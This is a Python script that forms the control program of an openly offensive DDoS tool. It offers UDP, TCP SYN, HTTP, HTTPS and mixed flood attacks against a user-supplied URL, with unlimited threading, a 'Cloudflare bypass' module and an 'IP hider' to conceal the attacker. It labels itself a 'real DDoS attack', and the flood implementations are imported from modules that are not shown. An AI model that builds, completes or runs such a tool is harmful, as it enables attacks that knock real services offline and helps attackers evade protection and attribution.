#!/usr/bin/env python3
"""
DDoS Attack Tool - Professional Edition
Owner: s3cret_proj3ct
"""

import os
import sys
import time
import threading
from urllib.parse import urlparse

# Add paths - PASTIKAN INI
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), 'handlers'))
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), 'utils'))

# Import handlers
try:
    from handlers.udp_flood import UDPFlood
    from handlers.tcp_syn import TCPSynFlood
    from handlers.http_flood import HTTPFlood
    from handlers.https_flood import HTTPSFlood
    from handlers.mixed_attack import MixedAttack
    print("✅ Handlers imported")
except Exception as e:
    print(f"❌ Handler import error: {e}")

# Import utils - PAKE DARI utils.
try:
    from utils.ip_hider import IPHider
    from utils.cloudflare_bypass import CloudflareBypass
    from utils.colors import Colors
    print("✅ Utils imported")
except Exception as e:
    print(f"❌ Util import error: {e}")
    sys.exit(1)

# ... rest of code ...
class DDoSTool:
    def __init__(self):
        self.running = False
        self.attack_thread = None
        self.ip_hider = IPHider()
        self.cf_bypass = CloudflareBypass()
        self.attacks = {
            1: UDPFlood(),
            2: TCPSynFlood(),
            3: HTTPFlood(),
            4: HTTPSFlood(),
            5: MixedAttack()
        }
    
    def print_banner(self):
        """Print big red DDOS banner"""
        banner = f"""
{Colors.RED}{Colors.BOLD}██████╗ ██████╗  ██████╗ ███████╗
{Colors.RED}██╔══██╗██╔══██╗██╔═══██╗██╔════╝
{Colors.RED}██║  ██║██║  ██║██║   ██║███████╗
{Colors.RED}██║  ██║██║  ██║██║   ██║╚════██║
{Colors.RED}██████╔╝██████╔╝╚██████╔╝███████║
{Colors.RED}╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝{Colors.RESET}

{Colors.YELLOW}Owner: s3cret_proj3ct{Colors.RESET}
{Colors.CYAN}IP Protection: {self.ip_hider.get_status()}{Colors.RESET}
{Colors.CYAN}Cloudflare Bypass: ENABLED{Colors.RESET}
"""
        print(banner)
    
    def print_menu(self):
        """Print attack menu"""
        menu = f"""
{Colors.GREEN}[1]{Colors.RESET} UDP FLOOD
{Colors.GREEN}[2]{Colors.RESET} TCP SYN FLOOD
{Colors.GREEN}[3]{Colors.RESET} HTTP FLOOD
{Colors.GREEN}[4]{Colors.RESET} HTTPS FLOOD
{Colors.GREEN}[5]{Colors.RESET} MIXED ATTACK
{Colors.GREEN}[6]{Colors.RESET} EXIT
"""
        print(menu)
    
    def get_threads_config(self):
        """Get threads configuration from user"""
        print(f"\n{Colors.YELLOW}Threads Configuration:{Colors.RESET}")
        print("0 = Unlimited spamming (infinite threads)")
        print("1-100 = Threads per second")
        
        try:
            threads = int(input(f"\n{Colors.CYAN}->{Colors.RESET} Threads per second (0-100): ").strip())
            
            if threads < 0:
                print(f"{Colors.RED}Invalid value. Using default: 1{Colors.RESET}")
                return 1
            elif threads > 100:
                print(f"{Colors.RED}Value too high. Using maximum: 100{Colors.RESET}")
                return 100
            else:
                return threads
        except:
            print(f"{Colors.RED}Invalid input. Using default: 1{Colors.RESET}")
            return 1
    
    def get_target_url(self):
        """Get and validate target URL"""
        print(f"\n{Colors.YELLOW}Target URL:{Colors.RESET}")
        
        while True:
            url = input(f"{Colors.CYAN}->{Colors.RESET} URL (with http/https): ").strip()
            
            if not url:
                print(f"{Colors.RED}URL cannot be empty{Colors.RESET}")
                continue
            
            if not url.startswith(('http://', 'https://')):
                print(f"{Colors.RED}URL must start with http:// or https://{Colors.RESET}")
                continue
            
            try:
                parsed = urlparse(url)
                if parsed.netloc:
                    return url
                else:
                    print(f"{Colors.RED}Invalid URL format{Colors.RESET}")
            except:
                print(f"{Colors.RED}Invalid URL{Colors.RESET}")
    
    def start_attack(self, method_num, target, threads_config):
        """Start the selected attack"""
        self.running = True
        
        # Hide local IP
        hidden_ip = self.ip_hider.hide_ip()
        print(f"\n{Colors.GREEN}[✓] IP Protected: {hidden_ip}{Colors.RESET}")
        
        # Cloudflare bypass check
        print(f"{Colors.YELLOW}[*] Checking Cloudflare protection...{Colors.RESET}")
        cf_status = self.cf_bypass.check(target)
        if cf_status['protected']:
            print(f"{Colors.GREEN}[✓] Cloudflare bypass method: {cf_status['method']}{Colors.RESET}")
        else:
            print(f"{Colors.GREEN}[✓] No Cloudflare detected{Colors.RESET}")
        
        # Get attack instance
        attack = self.attacks[method_num]
        
        # Start attack in thread
        self.attack_thread = threading.Thread(
            target=attack.start,
            args=(target, threads_config, self)
        )
        self.attack_thread.daemon = True
        self.attack_thread.start()
        
        # Monitoring
        self.monitor_attack(attack)
    
    def monitor_attack(self, attack):
        """Monitor attack progress"""
        start_time = time.time()
        
        try:
            while self.running:
                elapsed = time.time() - start_time
                stats = attack.get_stats()
                
                # Clear screen and show updated status
                os.system('clear')
                self.print_banner()
                
                status = f"""
{Colors.RED}[ ATTACK IN PROGRESS ]{Colors.RESET}

{Colors.YELLOW}Target:{Colors.RESET} {attack.target}
{Colors.YELLOW}Method:{Colors.RESET} {attack.name}
{Colors.YELLOW}Threads:{Colors.RESET} {stats['threads']}
{Colors.YELLOW}Packets:{Colors.RESET} {stats['packets']}
{Colors.YELLOW}Errors:{Colors.RESET} {stats['errors']}
{Colors.YELLOW}Duration:{Colors.RESET} {int(elapsed)} seconds
{Colors.YELLOW}IP Status:{Colors.RESET} {self.ip_hider.get_status()}

{Colors.RED}[ Press CTRL+C to stop ]{Colors.RESET}
"""
                print(status)
                
                time.sleep(1)
                
        except KeyboardInterrupt:
            self.stop_attack(attack)
    
    def stop_attack(self, attack):
        """Stop the current attack"""
        print(f"\n\n{Colors.YELLOW}[!] Stopping attack...{Colors.RESET}")
        self.running = False
        attack.stop()
        
        if self.attack_thread:
            self.attack_thread.join(timeout=2)
        
        stats = attack.get_stats()
        print(f"{Colors.GREEN}[✓] Attack stopped{Colors.RESET}")
        print(f"{Colors.CYAN}Total packets sent: {stats['packets']}{Colors.RESET}")
        print(f"{Colors.CYAN}Total errors: {stats['errors']}{Colors.RESET}")
        
        input(f"\n{Colors.YELLOW}Press Enter to continue...{Colors.RESET}")
    
    def run(self):
        """Main execution loop"""
        while True:
            os.system('clear')
            self.print_banner()
            self.print_menu()
            
            try:
                choice = input(f"{Colors.CYAN}->{Colors.RESET} Select option (1-6): ").strip()
                
                if choice == '6':
                    print(f"{Colors.GREEN}Exiting...{Colors.RESET}")
                    break
                
                try:
                    method_num = int(choice)
                    if method_num not in range(1, 6):
                        print(f"{Colors.RED}Invalid option{Colors.RESET}")
                        time.sleep(2)
                        continue
                except:
                    print(f"{Colors.RED}Invalid input{Colors.RESET}")
                    time.sleep(2)
                    continue
                
                # Get target URL
                target = self.get_target_url()
                if not target:
                    continue
                
                # Get threads configuration
                threads_config = self.get_threads_config()
                
                # Confirm attack
                print(f"\n{Colors.RED}[!] WARNING: This is a real DDoS attack{Colors.RESET}")
                confirm = input(f"{Colors.YELLOW}Launch attack? (y/n): {Colors.RESET}").lower()
                
                if confirm != 'y':
                    print(f"{Colors.GREEN}Attack cancelled{Colors.RESET}")
                    time.sleep(2)
                    continue
                
                # Start attack
                self.start_attack(method_num, target, threads_config)
                
            except KeyboardInterrupt:
                print(f"\n{Colors.GREEN}Exiting...{Colors.RESET}")
                break
            except Exception as e:
                print(f"{Colors.RED}Error: {e}{Colors.RESET}")
                time.sleep(2)

def main():
    tool = DDoSTool()
    tool.run()

if __name__ == "__main__":
    main()
